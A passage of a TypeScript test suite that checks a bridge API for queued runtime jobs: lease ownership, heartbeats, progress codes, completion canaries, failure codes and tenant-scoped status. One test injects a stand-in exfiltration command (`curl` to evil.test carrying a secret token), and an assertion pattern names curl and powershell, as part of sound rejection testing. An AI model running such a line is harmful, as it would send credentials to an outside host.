      assert.deepEqual(response, { status: 200, body: { ok: true, job: null } });

      const stopped = (await db.execute({
        sql: "SELECT status, claim_id, lease_id, error_code, error_retryable, finished_at FROM bridge_runtime_jobs WHERE id = ?",
        args: [revoked.job.id],
      })).rows[0];
      assert.equal(stopped.status, "failed");
      assert.equal(stopped.claim_id, "claim-revoked-requester");
      assert.equal(typeof stopped.lease_id, "string");
      assert.equal(stopped.error_code, "requester_seat_inactive");
      assert.equal(Number(stopped.error_retryable), 0);
      assert.equal(typeof stopped.finished_at, "string");

      const control = (await db.execute({
        sql: "SELECT status, claim_id, lease_id, error_code FROM bridge_runtime_jobs WHERE id = ?",
        args: [untouched.job.id],
      })).rows[0];
      assert.deepEqual(
        { status: control.status, claim_id: control.claim_id, lease_id: control.lease_id, error_code: control.error_code },
        { status: "queued", claim_id: null, lease_id: null, error_code: null },
      );
    } finally {
      inactiveSeats.delete(key);
    }
  });

  await check("heartbeat and progress require the authenticated pairing's live lease and accept codes, never commands", async () => {
    const pairing = await makePairing();
    const other = await makePairing();
    const queued = await runtime.enqueueRuntimeJob({
      tenantId: TENANT,
      userId: USER,
      pairingId: pairing.id,
      action: "probe",
      engine: { kind: "local", name: "ollama/llama3.3:70b" },
      prompt: "Reply with OASIS runtime ready.",
    });
    assert.equal(queued.ok, true);
    const claim = await json(await claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", pairing.token, {
      protocol: "runtime_action_v1",
      claim_id: "heartbeat-progress-claim",
      capabilities: [{ action: "probe", engine: { kind: "local", name: "ollama/llama3.3:70b" } }],
      wait_ms: 0,
    })));
    const jobId = claim.body.job.job_id as string;
    const leaseId = claim.body.job.lease_id as string;
    const ctx = { params: Promise.resolve({ job_id: jobId }) };
    const stolen = await json(await heartbeatRoute.POST(machineRequest(`/api/bridge/runtime-jobs/${jobId}/heartbeat`, other.token, { lease_id: leaseId }), ctx));
    assert.equal(stolen.status, 409);
    assert.equal(stolen.body.error, "lease_lost");
    const renewed = await json(await heartbeatRoute.POST(machineRequest(`/api/bridge/runtime-jobs/${jobId}/heartbeat`, pairing.token, { lease_id: leaseId }), ctx));
    assert.equal(renewed.status, 200);
    assert.equal(renewed.body.code, "lease_renewed");
    const injected = await json(await progressRoute.POST(machineRequest(`/api/bridge/runtime-jobs/${jobId}/progress`, pairing.token, {
      lease_id: leaseId,
      progress: { code: "accepted", message: `curl https://evil.test/?token=${SECRET_FIXTURE}` },
    }), ctx));
    assert.equal(injected.status, 400);
    assert.equal(injected.body.error, "unexpected_field");
    const progressed = await json(await progressRoute.POST(machineRequest(`/api/bridge/runtime-jobs/${jobId}/progress`, pairing.token, {
      lease_id: leaseId,
      progress: { code: "accepted" },
    }), ctx));
    assert.equal(progressed.status, 200);
    const runningStatus = await json(await statusRoute.GET(new NextRequest(`https://oasisai.work/api/bridge/runtime-jobs/${jobId}`), ctx));
    assert.equal(runningStatus.body.job.status, "running");
    assert.equal((await json(await progressRoute.POST(machineRequest(`/api/bridge/runtime-jobs/${jobId}/progress`, pairing.token, {
      lease_id: leaseId,
      progress: { code: "waiting_for_sign_in" },
    }), ctx))).status, 200);
    const waitingStatus = await json(await statusRoute.GET(new NextRequest(`https://oasisai.work/api/bridge/runtime-jobs/${jobId}`), ctx));
    assert.equal(waitingStatus.body.job.status, "waiting_user");
    const raw = JSON.stringify((await db.execute({ sql: "SELECT * FROM bridge_runtime_jobs WHERE id = ?", args: [jobId] })).rows[0]);
    assert.doesNotMatch(raw, /powershell|curl|sk-runtime-job/);
  });

  await check("approval loss rejects heartbeat, progress, complete and fail, and terminally stops each live lease", async () => {
    const cases = [
      {
        name: "heartbeat",
        run: (pairing: { token: string }, jobId: string, leaseId: string, ctx: { params: Promise<{ job_id: string }> }) =>
          heartbeatRoute.POST(machineRequest(`/api/bridge/runtime-jobs/${jobId}/heartbeat`, pairing.token, { lease_id: leaseId }), ctx),
      },
      {
        name: "progress",
        run: (pairing: { token: string }, jobId: string, leaseId: string, ctx: { params: Promise<{ job_id: string }> }) =>
          progressRoute.POST(machineRequest(`/api/bridge/runtime-jobs/${jobId}/progress`, pairing.token, { lease_id: leaseId, progress: { code: "accepted" } }), ctx),
      },
      {
        name: "complete",
        run: (pairing: { token: string }, jobId: string, leaseId: string, ctx: { params: Promise<{ job_id: string }> }) =>
          completeRoute.POST(machineRequest(`/api/bridge/runtime-jobs/${jobId}/complete`, pairing.token, { lease_id: leaseId, result: { code: "probe_ok", answer: "OASIS_RUNTIME_READY" } }), ctx),
      },
      {
        name: "fail",
        run: (pairing: { token: string }, jobId: string, leaseId: string, ctx: { params: Promise<{ job_id: string }> }) =>
          failRoute.POST(machineRequest(`/api/bridge/runtime-jobs/${jobId}/fail`, pairing.token, { lease_id: leaseId, error: { code: "runtime_probe_failed", retryable: true } }), ctx),
      },
    ];
    for (const [index, scenario] of cases.entries()) {
      const pairing = await makePairing();
      const queued = await runtime.enqueueRuntimeJob({
        tenantId: TENANT,
        userId: USER,
        pairingId: pairing.id,
        action: "probe",
        engine: { kind: "cli", name: "codex" },
        prompt: "Reply with OASIS runtime ready.",
      });
      assert.equal(queued.ok, true, scenario.name);
      const claimed = await json(await claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", pairing.token, {
        protocol: "runtime_action_v1",
        claim_id: `approval-loss-${scenario.name}`,
        capabilities: [{ action: "probe", engine: { kind: "cli", name: "codex" } }],
        wait_ms: 0,
      })));
      const jobId = claimed.body.job.job_id as string;
      const leaseId = claimed.body.job.lease_id as string;
      const ctx = { params: Promise.resolve({ job_id: jobId }) };
      if (index === 0) {
        await db.execute({ sql: "UPDATE bridge_pairings SET claim_enabled_at = NULL, claim_enabled_by = NULL WHERE id = ?", args: [pairing.id] });
      } else {
        await db.execute({ sql: "UPDATE bridge_pairings SET paired_via = 'signup_secret' WHERE id = ?", args: [pairing.id] });
      }
      const refused = await json(await scenario.run(pairing, jobId, leaseId, ctx));
      assert.equal(refused.status, 403, scenario.name);
      assert.equal(refused.body.error, "pairing_not_approved", scenario.name);
      const row = (await db.execute({ sql: "SELECT status, error_code, finished_at FROM bridge_runtime_jobs WHERE id = ?", args: [jobId] })).rows[0];
      assert.equal(row.status, "failed", `${scenario.name}: live lease was not stopped`);
      assert.equal(row.error_code, "pairing_approval_lost", scenario.name);
      assert.equal(typeof row.finished_at, "string", scenario.name);
    }
  });

  await check("requester deactivation after claim cancels heartbeat, progress, complete and fail for probe and auth jobs", async () => {
    const cases = [
      {
        name: "heartbeat-probe",
        action: "probe" as const,
        run: (pairing: { token: string }, jobId: string, leaseId: string, ctx: { params: Promise<{ job_id: string }> }) =>
          heartbeatRoute.POST(machineRequest(`/api/bridge/runtime-jobs/${jobId}/heartbeat`, pairing.token, { lease_id: leaseId }), ctx),
      },
      {
        name: "progress-auth",
        action: "auth" as const,
        run: (pairing: { token: string }, jobId: string, leaseId: string, ctx: { params: Promise<{ job_id: string }> }) =>
          progressRoute.POST(machineRequest(`/api/bridge/runtime-jobs/${jobId}/progress`, pairing.token, { lease_id: leaseId, progress: { code: "waiting_for_sign_in" } }), ctx),
      },
      {
        name: "complete-probe",
        action: "probe" as const,
        run: (pairing: { token: string }, jobId: string, leaseId: string, ctx: { params: Promise<{ job_id: string }> }) =>
          completeRoute.POST(machineRequest(`/api/bridge/runtime-jobs/${jobId}/complete`, pairing.token, { lease_id: leaseId, result: { code: "probe_ok", answer: "OASIS_RUNTIME_READY" } }), ctx),
      },
      {
        name: "fail-auth",
        action: "auth" as const,
        run: (pairing: { token: string }, jobId: string, leaseId: string, ctx: { params: Promise<{ job_id: string }> }) =>
          failRoute.POST(machineRequest(`/api/bridge/runtime-jobs/${jobId}/fail`, pairing.token, { lease_id: leaseId, error: { code: "auth_process_failed", retryable: true } }), ctx),
      },
    ];
    const requesterKey = seatKey(TENANT, OTHER_USER);
    for (const scenario of cases) {
      const pairing = await makePairing({ userId: USER });
      const queued = await runtime.enqueueRuntimeJob({
        tenantId: TENANT,
        userId: OTHER_USER,
        pairingId: pairing.id,
        action: scenario.action,
        engine: { kind: "cli", name: "codex" },
        ...(scenario.action === "probe" ? { prompt: "Reply with OASIS runtime ready." } : {}),
      });
      assert.equal(queued.ok, true, scenario.name);
      if (!queued.ok) continue;
      const claimed = await json(await claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", pairing.token, {
        protocol: "runtime_action_v1",
        claim_id: `requester-revoked-${scenario.name}`,
        capabilities: [{ action: scenario.action, engine: { kind: "cli", name: "codex" } }],
        wait_ms: 0,
      })));
      assert.equal(claimed.status, 200, scenario.name);
      const jobId = claimed.body.job.job_id as string;
      const leaseId = claimed.body.job.lease_id as string;
      const ctx = { params: Promise.resolve({ job_id: jobId }) };
      try {
        inactiveSeats.add(requesterKey);
        const refused = await json(await scenario.run(pairing, jobId, leaseId, ctx));
        assert.equal(refused.status, 403, scenario.name);
        assert.equal(refused.body.error, "requester_seat_inactive", scenario.name);
        const row = (await db.execute({
          sql: "SELECT status, error_code, error_retryable, finished_at FROM bridge_runtime_jobs WHERE id = ?",
          args: [jobId],
        })).rows[0];
        assert.equal(row.status, "failed", scenario.name);
        assert.equal(row.error_code, "requester_seat_inactive", scenario.name);
        assert.equal(Number(row.error_retryable), 0, scenario.name);
        assert.equal(typeof row.finished_at, "string", scenario.name);
      } finally {
        inactiveSeats.delete(requesterKey);
      }
    }
  });

  await check("completion requires the exact inference canary, stores only structured results, and rejects later lease writes", async () => {
    const pairing = await makePairing();
    const queued = await runtime.enqueueRuntimeJob({
      tenantId: TENANT,
      userId: USER,
      pairingId: pairing.id,
      action: "probe",
      engine: { kind: "cli", name: "claude" },
      prompt: "Reply with OASIS runtime ready.",
    });
    assert.equal(queued.ok, true);
    const claim = await json(await claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", pairing.token, {
      protocol: "runtime_action_v1",
      claim_id: "complete-probe-claim",
      capabilities: [{ action: "probe", engine: { kind: "cli", name: "claude" } }],
      wait_ms: 0,
    })));
    const jobId = claim.body.job.job_id as string;
    const leaseId = claim.body.job.lease_id as string;
    const ctx = { params: Promise.resolve({ job_id: jobId }) };
    const unknownResult = await json(await completeRoute.POST(machineRequest(`/api/bridge/runtime-jobs/${jobId}/complete`, pairing.token, {
      lease_id: leaseId,
      result: { code: "probe_ok", answer: "ready", api_key: SECRET_FIXTURE },
    }), ctx));
    assert.equal(unknownResult.status, 400);
    assert.equal(unknownResult.body.error, "unexpected_result_field");
    const falsePositive = await json(await completeRoute.POST(machineRequest(`/api/bridge/runtime-jobs/${jobId}/complete`, pairing.token, {
      lease_id: leaseId,
      result: { code: "probe_ok", answer: `ready ${SECRET_FIXTURE}`, model: "claude-sonnet", latency_ms: 321 },
    }), ctx));
    assert.equal(falsePositive.status, 400);
    assert.equal(falsePositive.body.error, "invalid_result");
    const completed = await json(await completeRoute.POST(machineRequest(`/api/bridge/runtime-jobs/${jobId}/complete`, pairing.token, {
      lease_id: leaseId,
      result: { code: "probe_ok", answer: "OASIS_RUNTIME_READY", model: "claude-sonnet", latency_ms: 321 },
    }), ctx));
    assert.equal(completed.status, 200);
    const row = (await db.execute({ sql: "SELECT status, result_json, finished_at FROM bridge_runtime_jobs WHERE id = ?", args: [jobId] })).rows[0];
    assert.equal(row.status, "completed");
    assert.doesNotMatch(String(row.result_json), /sk-runtime-job/);
    assert.match(String(row.result_json), /OASIS_RUNTIME_READY/);
    const receipts = await runtime.readLatestRuntimeProbeReceipts(TENANT, [pairing.id]);
    const receipt = receipts.get(runtime.runtimeProbeReceiptKey(pairing.id, { kind: "cli", name: "claude" }));
    assert.equal(receipt?.ready, true, "the exact completed probe is the readiness receipt");
    assert.equal(receipt?.finishedAt, row.finished_at, "last tested comes from probe completion, not a heartbeat timestamp");
    assert.equal(receipts.has(runtime.runtimeProbeReceiptKey(pairing.id, { kind: "cli", name: "codex" })), false);
    const publicDone = await json(await statusRoute.GET(new NextRequest(`https://oasisai.work/api/bridge/runtime-jobs/${jobId}`), ctx));
    assert.equal(publicDone.body.job.status, "done");
    assert.equal(publicDone.body.job.errorCode, null);
    assert.match(JSON.stringify(publicDone.body.job.result), /OASIS_RUNTIME_READY/);
    const tooLate = await json(await heartbeatRoute.POST(machineRequest(`/api/bridge/runtime-jobs/${jobId}/heartbeat`, pairing.token, { lease_id: leaseId }), ctx));
    assert.equal(tooLate.status, 409);
    assert.equal(tooLate.body.error, "lease_lost");
  });

  await check("fail accepts only stable error codes and refuses a lost or expired lease", async () => {
    const pairing = await makePairing();
    const queued = await runtime.enqueueRuntimeJob({
      tenantId: TENANT,
      userId: USER,
      pairingId: pairing.id,
      action: "auth",
      engine: { kind: "cli", name: "claude" },
    });
    assert.equal(queued.ok, true);
    const claim = await json(await claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", pairing.token, {
      protocol: "runtime_action_v1",
      claim_id: "fail-auth-claim",
      capabilities: [{ action: "auth", engine: { kind: "cli", name: "claude" } }],
      wait_ms: 0,
    })));
    const jobId = claim.body.job.job_id as string;
    const leaseId = claim.body.job.lease_id as string;
    const ctx = { params: Promise.resolve({ job_id: jobId }) };
    const arbitrary = await json(await failRoute.POST(machineRequest(`/api/bridge/runtime-jobs/${jobId}/fail`, pairing.token, {
      lease_id: leaseId,
      error: { code: "run_this_command_instead", retryable: false },
    }), ctx));
    assert.equal(arbitrary.status, 400);
    assert.equal(arbitrary.body.error, "unsupported_failure_code");
    const failed = await json(await failRoute.POST(machineRequest(`/api/bridge/runtime-jobs/${jobId}/fail`, pairing.token, {
      lease_id: leaseId,
      error: { code: "account_identity_unavailable", retryable: true },
    }), ctx));
    assert.equal(failed.status, 200);
    assert.deepEqual(
      (await db.execute({ sql: "SELECT status, error_code, error_retryable FROM bridge_runtime_jobs WHERE id = ?", args: [jobId] })).rows[0],
      { status: "failed", error_code: "account_identity_unavailable", error_retryable: 1 },
    );
    const publicFailed = await json(await statusRoute.GET(new NextRequest(`https://oasisai.work/api/bridge/runtime-jobs/${jobId}`), ctx));
    assert.equal(publicFailed.body.job.status, "failed");
    assert.equal(publicFailed.body.job.errorCode, "account_identity_unavailable");
    assert.match(publicFailed.body.job.message, /cannot identify/i);

    const expiring = await runtime.enqueueRuntimeJob({
      tenantId: TENANT,
      userId: USER,
      pairingId: pairing.id,
      action: "auth",
      engine: { kind: "cli", name: "codex" },
    });
    assert.equal(expiring.ok, true);
    const expiringClaim = await json(await claimRoute.POST(machineRequest("/api/bridge/runtime-jobs/claim", pairing.token, {
      protocol: "runtime_action_v1",
      claim_id: "expired-auth-claim",
      capabilities: [{ action: "auth", engine: { kind: "cli", name: "codex" } }],
      wait_ms: 0,
    })));
    const expiredJobId = expiringClaim.body.job.job_id;
    const expiredLeaseId = expiringClaim.body.job.lease_id;
    const expiredCtx = { params: Promise.resolve({ job_id: expiredJobId }) };
    await db.execute({ sql: "UPDATE bridge_runtime_jobs SET deadline_at = ? WHERE id = ?", args: ["2020-01-01T00:00:00.000Z", expiredJobId] });
    const expired = await json(await failRoute.POST(machineRequest(`/api/bridge/runtime-jobs/${expiredJobId}/fail`, pairing.token, {
      lease_id: expiredLeaseId,
      error: { code: "auth_process_failed", retryable: true },
    }), expiredCtx));
    assert.equal(expired.status, 409);
    assert.equal(expired.body.error, "lease_lost");
  });

  await check("browser status is session-authenticated and scoped to both tenant and owning user", async () => {
    const pairing = await makePairing();
    const queued = await runtime.enqueueRuntimeJob({
      tenantId: TENANT,
      userId: USER,
      pairingId: pairing.id,
      action: "auth",
      engine: { kind: "cli", name: "codex" },
    });
    assert.equal(queued.ok, true);
    if (!queued.ok) return;
    const jobId = queued.job.id;
    const ctx = { params: Promise.resolve({ job_id: jobId }) };
    const request = new NextRequest(`https://oasisai.work/api/bridge/runtime-jobs/${jobId}`);
    browserSession = { ...browserSession, ok: true, userId: USER, tenantId: TENANT } as Session;
    const mine = await json(await statusRoute.GET(request, ctx));
    assert.equal(mine.status, 200);
    assert.deepEqual(Object.keys(mine.body.job).sort(), ["action", "engine", "errorCode", "id", "message", "result", "status"].sort());
    assert.equal(mine.body.job.id, jobId);
    assert.equal(mine.body.job.status, "queued");
    assert.equal(mine.body.job.errorCode, null);
    assert.equal(mine.body.job.result, null);
    assert.equal(typeof mine.body.job.message, "string");
    assert.equal(mine.body.job.lease_id, undefined);
    assert.equal(mine.body.job.prompt, undefined);
    browserSession = { ...browserSession, ok: true, userId: OTHER_USER, tenantId: TENANT } as Session;
    assert.equal((await json(await statusRoute.GET(request, ctx))).status, 404);
    browserSession = { ...browserSession, ok: true, userId: USER, tenantId: OTHER_TENANT } as Session;
    assert.equal((await json(await statusRoute.GET(request, ctx))).status, 404);
    browserSession = { ok: false, reason: "no_session" };
    assert.equal((await json(await statusRoute.GET(request, ctx))).status, 401);
  });

  await check("browser polling turns an abandoned queued job into a clear terminal repair", async () => {
    const pairing = await makePairing();
    const staleAt = new Date(Date.now() - runtime.RUNTIME_QUEUED_TTL_MS - 5_000);
    const queued = await runtime.enqueueRuntimeJob({
      tenantId: TENANT,
      userId: USER,
      pairingId: pairing.id,
      action: "probe",
      engine: { kind: "cli", name: "codex" },
      prompt: "Reply with OASIS runtime ready.",
      now: staleAt,
    });
    assert.equal(queued.ok, true);
    if (!queued.ok) return;
    browserSession = { ...browserSession, ok: true, userId: USER, tenantId: TENANT } as Session;
    const ctx = { params: Promise.resolve({ job_id: queued.job.id }) };
    const status = await json(await statusRoute.GET(new NextRequest(`https://oasisai.work/api/bridge/runtime-jobs/${queued.job.id}`), ctx));
    assert.equal(status.status, 200);
    assert.equal(status.body.job.status, "failed");
    assert.equal(status.body.job.errorCode, "queue_expired");
    assert.match(String(status.body.job.message), /did not pick up.*connector.*try again/i);
  });

  console.log(`\n${passed} passed, ${failures} failed`);
  if (failures > 0) process.exit(1);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
